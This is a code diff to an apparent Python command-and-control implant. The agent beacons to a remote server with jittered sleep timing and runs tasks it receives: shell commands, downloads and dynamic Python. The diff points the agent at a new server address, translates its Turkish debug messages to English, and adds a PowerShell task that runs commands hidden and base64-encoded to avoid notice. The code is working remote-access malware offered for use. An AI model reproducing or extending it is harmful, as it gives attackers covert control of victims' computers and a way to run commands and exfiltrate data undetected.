@@ -1,8 +1,17 @@
-import contextlib, io, time, random, json, uuid, datetime, subprocess, traceback, platform
+import contextlib
+import io
+import time
+import random
+import json
+import uuid
+import datetime
+import subprocess
+import traceback
+import platform
 from Encryption import encrypt_data, decrypt_data
 from curl_cffi.requests import Session
 #Configuration
-SERVER = 'http://127.0.0.1:5000' # YOUR SERVER IP
+SERVER = 'http://10.116.64.182:443' # YOUR SERVER IP
 BEACON_ENDPOINT = "/api/beacon"
 RESULT_ENDPOINT = '/api/result'
 SLEEP_MIN= 10
@@ -21,7 +30,7 @@ if platform.system() == "Windows":
 else:
     AGENT_FILE = os.path.expanduser("~/.c2_agent_id")
 try:
-# Dosya varsa oku, yoksa yeni oluştur ve kaydet
+
     if os.path.exists(AGENT_FILE):
         with open(AGENT_FILE, "r", encoding="utf-8") as f:
             AGENT_ID = f.read().strip()
@@ -32,7 +41,7 @@ try:
 except Exception as e:
     AGENT_ID = str(uuid.uuid4())[:8]
 
-print(f"Agent ID (kalıcı): {AGENT_ID}")   # ← test için, sonra silersin
+print(f"Agent ID: {AGENT_ID}")
 
 
 def get_session():
@@ -85,7 +94,7 @@ def dynamic_sleep():
     else: #Nights/Weekends
         sleep_time =  random.randint(SLEEP_MIN * 2 ,SLEEP_MAX * 3)
     jitter = sleep_time * 0.1 * (random.random() - 0.5)
-    return max(0, sleep_time + jitter)
+    return max(0, sleep_time + int(jitter))
 
 def beacon():
     max_attempts = 3
@@ -100,11 +109,11 @@ def beacon():
             }
             payload = {"id": AGENT_ID}
             plain_json = json.dumps(payload)
-            print("[DEBUG agent] Gönderilecek plain JSON:", plain_json)
+            print("[DEBUG agent] Sending plain JSON:", plain_json)
 
             encrypted_payload = encrypt_data(json.dumps(payload))
-            print("[DEBUG agent] Şifrelenen token:", encrypted_payload[:150], "...")
-            print("[DEBUG agent] Token uzunluğu:", len(encrypted_payload))
+            print("[DEBUG agent] Encrypted token:", encrypted_payload[:150], "...")
+            print("[DEBUG agent] Token Length:", len(encrypted_payload))
 
             try:
                 response = session.post(f"{SERVER}{BEACON_ENDPOINT}",
@@ -124,7 +133,7 @@ def beacon():
 
             except Exception as e:
                 print(f"[!] Beacon error: {e}")
-                print("[DEBUG agent] Gönderme hatası:", str(e))
+                print("[DEBUG agent] Cannot Sending - ERROR:", str(e))
         except Exception as e:
             print(f"[!] Beacon error: (attempt {attempt}/{max_attempts}): {e}")
         if attempt < max_attempts:
@@ -139,6 +148,10 @@ def execute_task(task, session):
     if task_type == 'shell':
         command = task.get('command')
         run_shell_command(command,session)
+
+    elif task_type == 'powershell':
+        ps_command = task.get('command', '')
+        run_powershell(ps_command, session)
 
     elif task_type == 'download':
         url = task.get('url')
@@ -218,6 +231,24 @@ def run_shell_command(command, session):
         post_result(f"[!] Command timed out",session)
     except Exception as e:
         post_result(f"[!] Shell execution error: {str(e)}",session)
+
+def run_powershell(command, session):
+    """PowerShell komutlarını çalıştır"""
+    ps_script = f'''
+    $output = try {{ 
+        {command} 
+    }} catch {{ 
+        "ERROR: $_" 
+    }}
+    $output | Out-String
+    '''
+
+    # PYTHON ile Base64 encode yap
+    import base64
+    encoded = base64.b64encode(ps_script.encode('utf-16-le')).decode()
+    full_cmd = f'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {encoded}'
+
+    run_shell_command(full_cmd, session)
 
 def run_dynamic_python(code_snippet, session):
     output_buffer = io.StringIO()
